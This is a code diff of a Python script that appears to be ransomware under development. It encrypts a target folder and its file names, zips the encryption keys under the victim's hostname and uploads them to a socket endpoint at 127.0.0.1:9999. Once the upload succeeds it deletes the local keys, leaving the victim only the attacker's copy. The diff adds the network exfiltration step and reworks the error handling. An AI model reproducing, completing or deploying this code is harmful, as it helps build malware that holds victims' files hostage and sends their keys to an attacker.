@@ -8,9 +8,11 @@ import os
 from upload import upload
 from zip import *
 from cleanUp import clean
-from filename import *
+from encFilenames import *
 # from pbar import pbar
 import socket
+
+
 
 thispath = os.getcwd()
 hostname = socket.gethostname()
@@ -19,6 +21,10 @@ target = 'testfolder' # targeting folder
 keyfolder = 'd3vil-keys/' #path to safe keyfiles
 zpname = hostname.replace(' ', '-') + '.zip' #path to zip-file
 sep = '#SEP#'
+
+HOST = '127.0.0.1'
+PORT = 9999
+
 
 def encrypt_medium(src, dst):
     print(f"Encrypt medium: {src}\nKeyfile: {dst}\n")
@@ -48,36 +54,30 @@ def encrypt(src, key_dst, filename):
 
 
 if __name__ == "__main__":
+    error = 0
     if os.path.exists('log.txt') == True:
         os.remove('log.txt')
-        
-    now = datetime.now()    #get actual time
-    now = now.strftime('%H:%M:%S')
+    now = datetime.now().strftime('%H:%M:%S')    #get actual time
     
     try:
         #encrypt target
-        filename = encrypt_medium(target, keyfolder)
+        encrypt_medium(target, keyfolder)
         print(f'\nENCRYPTED {target} [x]')
-        error = "no error"
     except Exception as e:
         print(f'\nENCRYPTED {target} [ ]')
+        error += 1
         
     writepath(target, keyfolder, sep)   #safe pathnames in a file and log answer
     encrName(target)                    #encrypr filenames and log answer
     
     try:
-        #zip keyfile folder
-        with zipfile.ZipFile(zpname, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            zipdir(keyfolder, zipf)
-        #send keyfile-zip via email
-        if upload(zpname) == True:
-            #remove keyfiles (folder and zip)
-            clean(keyfolder)
+        zipdir(keyfolder, zpname)   
+        
+        if upload(HOST, PORT, zpname) == True:  #send keyfile-zip via email    
+            clean(keyfolder)    #remove keyfiles (folder and zip) if data was sended successfully
             os.remove(zpname)
 
     except Exception as e:
-        ans = 'Some Error occurred!!'
-        print(ans)
-                
+        print('Some Error occurred!!')
         print(e)
         exit()
